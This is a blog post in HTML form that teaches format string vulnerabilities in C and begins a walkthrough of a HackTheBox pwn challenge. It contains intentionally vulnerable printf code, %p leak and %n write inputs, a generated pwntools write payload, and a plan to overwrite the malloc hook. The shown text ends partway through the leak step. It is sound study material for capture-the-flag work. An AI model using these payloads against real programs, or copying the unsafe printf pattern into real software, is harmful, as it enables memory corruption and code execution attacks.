@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://example.org/posts/format0/" />
+  <link rel="canonical" href="http://example.org/posts/format0/" /><link rel="alternate" type="application/atom+xml" href="http://example.org/index.xml" title="My New Hugo Site">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/example.org\/"
+      },
+      "articleSection" : "posts",
+      "name" : "What is format strings? How do they work?",
+      "headline" : "What is format strings? How do they work?",
+      "description" : "Format string: A Mini Study - with challenge This will be a short, and practical walkthrough of the concept \u0026ldquo;format string\u0026rdquo;, with an example of how to solve a format string challenge.\nResearch and everything format string Format is a pwn task on HackTheBox revolving around the idea of format strings (eg. %s, %d, %p), which is a C feature, that allows a strings to contain both words and variables in one.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-09-08 15:33:45 \u002b0200 CEST",
+      "dateModified" : "2021-09-08 15:33:45 \u002b0200 CEST",
+      "url" : "http:\/\/example.org\/posts\/format0\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>What is format strings? How do they work?</title>
+  <meta property="og:title" content="What is format strings? How do they work?" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Format string: A Mini Study - with challenge This will be a short, and practical walkthrough of the concept &amp;ldquo;format string&amp;rdquo;, with an example of how to solve a format string challenge.
+Research and everything format string Format is a pwn task on HackTheBox revolving around the idea of format strings (eg. %s, %d, %p), which is a C feature, that allows a strings to contain both words and variables in one." />
+  <meta name="description" content="Format string: A Mini Study - with challenge This will be a short, and practical walkthrough of the concept &amp;ldquo;format string&amp;rdquo;, with an example of how to solve a format string challenge.
+Research and everything format string Format is a pwn task on HackTheBox revolving around the idea of format strings (eg. %s, %d, %p), which is a C feature, that allows a strings to contain both words and variables in one." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="My New Hugo Site">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefx</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">What is format strings? How do they work?</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2021-09-08 15:33:45 CEST">
+                08 Sep 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="format-string-a-mini-study---with-challenge">Format string: A Mini Study - with challenge</h1>
+<p>This will be a short, and practical walkthrough of the concept &ldquo;format string&rdquo;, with an example of how to solve a format string challenge.</p>
+<h1 id="research-and-everything-format-string">Research and everything format string</h1>
+<p>Format is a pwn task on HackTheBox revolving around the idea of format strings (eg. %s, %d, %p), which is a C feature, that allows a strings to contain both words and variables in one. Like such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> hack_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+    printf(<span style="color:#e6db74">&#34;Number is: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hack_number);
+}
+</code></pre></div><p>This means that a string if printed and contains one of these it will print whatever the format specifies. There&rsquo;s a wide variety of specifiers programmers can use for this some would be:</p>
+<pre tabindex="0"><code>%c - looks at an address and prints the char (reads one byte)
+%s - looks at an address and prints the string (reads till null byte)
+%d - looks at an address and prints the integer
+%p - prints an address
+%f - prints a float
+</code></pre><p>Now while this might not currently seem like a security vulnerability it most definitely can become one. A common error is that a C programmer, trusts to receive a string from a user, and simply print it. This could be to receive a username, and print said username:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">20</span>];    
+    read(<span style="color:#ae81ff">0</span>, buffer, <span style="color:#ae81ff">20</span>); <span style="color:#75715e">//Reads from standard input to buffer, 20 bytes
+</span><span style="color:#75715e"></span>
+    printf(buffer); <span style="color:#75715e">//Prints whatever lies at the address of buffer
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Compiling the program with gcc and run it, try to send %p %p %p from stdin:</p>
+<pre tabindex="0"><code>cave@townie:$ ./a.out 
+%p %p %p %p
+0x7fff5b31d0e0 0x14 0x7f695e945b82 (nil)
+</code></pre><p>As one can see, we get a bunch of addresses. The weird thing is, that we never read any addresses into &ldquo;buffer&rdquo;, so where are these addresses from? We are leaking values now! This is not very good, and if this is a possibility one should be very wary of the possibilities.</p>
+<p>Imagine the following print statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;num1: %d, num2: %d, num3: %d, str1: %s&#34;</span>, num1, num2, num3, str1);
+</code></pre></div><p>Let&rsquo;s quickly remember now, that printf is a function from libc, and we feed it the arguments of &ldquo;num1, num2, num3, str1&rdquo;. We remember that everytime we use a function, and give it variables, these are passed on the stack. Now it makes sense why &ldquo;%p %p %p %p&rdquo;, gives us addresses from memory!</p>
+<p>Now %s, looks at an address, and prints the value there&hellip; Cool&hellip; and we know that segfaults are caused by a program trying to read or write from or to an illegal memory location. What would happen if we sent a lot of &ldquo;%s %s &hellip;&rdquo;, it would segfault!
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+There&rsquo;s also something called &ldquo;Direct Parameter Access&rdquo;, which essentially states, that we can read anywhere, if we know the offset from where we are. That looks like this:</p>
+<pre tabindex="0"><code>%[offset]$[type]
+(eg. %4$s, %5$s, %1$s, %1337$s
+</code></pre><p>Last but not least, format string is turing complete, which means that we can execute any calculation with it (might not be fast tho) - this leads to being able to read AND write to any point in memory, if we have a format string, and can leak memory properly, we can control overwrite everything we&rsquo;re allowed to. This can be done by the specifier &ldquo;%n&rdquo;.<!-- raw HTML omitted --><!-- raw HTML omitted -->
+But how does &ldquo;%n&rdquo; work? It prints nothing, and reads the characters printed before it, into an address (or rather to a pointer of a signed int):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+  <span style="color:#66d9ef">int</span> val;
+
+  printf(<span style="color:#e6db74">&#34;blah %n blah</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>val);
+  printf(<span style="color:#e6db74">&#34;val = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, val);
+}
+
+Output <span style="color:#f92672">&gt;&gt;</span> val <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</code></pre></div><p>We wont go too much into the details exactly of making a format string payload manually, because our beloved pwntools &lt;3, has this exact feature:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Python <span style="color:#ae81ff">3.9.5</span> (default, May <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">2021</span>, <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">37</span>) 
+[GCC <span style="color:#ae81ff">10.3.0</span>] on linux
+Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> fmtstr_payload(<span style="color:#ae81ff">1</span>, {<span style="color:#ae81ff">0xdeadbeef</span>: <span style="color:#ae81ff">0xcafebabe</span>})
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%190c</span><span style="color:#e6db74">%7$lln</span><span style="color:#e6db74">%12c</span><span style="color:#e6db74">%8$hhn</span><span style="color:#e6db74">%52c</span><span style="color:#e6db74">%9$hhn</span><span style="color:#e6db74">%188c</span><span style="color:#e6db74">%10$hhnaaaab</span><span style="color:#ae81ff">\xef\xbe\xad\xde\x00\x00\x00\x00\xf2\xbe\xad\xde\x00\x00\x00\x00\xf1\xbe\xad\xde\x00\x00\x00\x00\xf0\xbe\xad\xde\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><h1 id="the-challenge---recon">The challenge - recon</h1>
+<p>Let&rsquo;s start by quickly looking at the binaries security using checksec:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/pwn/format_$ checksec format
+[*] '/home/cave/CTF/pwn/format_/format'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>Everything is on. Full RELRO means we cannot overwrite the global offset table. PIE meaning we have to leak the binary base somehow to find anything. Cool:)</p>
+<p>Opening in ida, we see only one function being called during main, which is the echo function.
+<img src="https://cavetownie.github.io/pictures/IDA.png" alt="Echo function"></p>
+<p>The echo function just reads from stdin into a buffer, and prints that buffer without any sanity checks - this means we have a format string vulnerability.</p>
+<h1 id="game-plan">Game plan</h1>
+<p>Now that we know we have a format string vulnerability, we need to find out how to use it. But as we&rsquo;re in an infinite loop, with no ways of overwriting the global offset table, what do we overwrite?</p>
+<p>There are two targets that&rsquo;s specially interesting.</p>
+<ol>
+<li>Overwrite the return address of printf (on the stack)</li>
+<li>Overwrite what lies at &ldquo;malloc hook&rdquo;, and then send a lot of characters so malloc will be called to allocate memory</li>
+</ol>
+<p>What would we need to do each of these plans?</p>
+<ol>
+<li>We would need to leak a stack address, then find the offset between the return of printf, and the leaked address.<!-- raw HTML omitted -->After that we would need to leak the libc version, so that we could put a one gadget as the printf return.</li>
+<li>We would need to leak the libc address, and overwrite malloc hook with a one gadget</li>
+</ol>
+<p>Now while both are definitely viable, the easier one would be to overwrite malloc hook.</p>
+<p>Let&rsquo;s start by running the binary and look at the pointers we can leak:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/pwn/format_$ ./format 
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
